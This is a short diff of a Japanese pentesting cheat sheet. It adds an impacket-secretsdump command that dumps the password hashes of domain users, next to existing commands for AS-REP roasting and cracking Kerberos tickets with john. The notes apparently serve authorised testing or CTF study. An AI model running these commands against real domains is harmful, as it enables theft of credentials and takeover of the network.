@@ -27,6 +27,9 @@
    「`impacket-GetNPusers` -format john -no-pass -dc-ip ドメコンIP ドメイン名/ユーザ名」  
    で`ASREPRoast`（Kerberos事前認証を必要としていないユーザのTGTチケットを取得できる）を実行  
    取得したTGTチケットを「john --wordlist=Wordlist名 Ticketファイル」でクラックできる
+  - secretsdump  
+    「`impacket-secretsdump` -just-dc ドメイン名/ユーザ名:パスワード@IPアドレス」  
+    でドメインユーザのパスワードハッシュをダンプできる。
 - [kerbrute](https://github.com/ropnop/kerbrute) (kali×, Go)
   - install  
     GitHub上のReleaseからLinuxバイナリをインストール
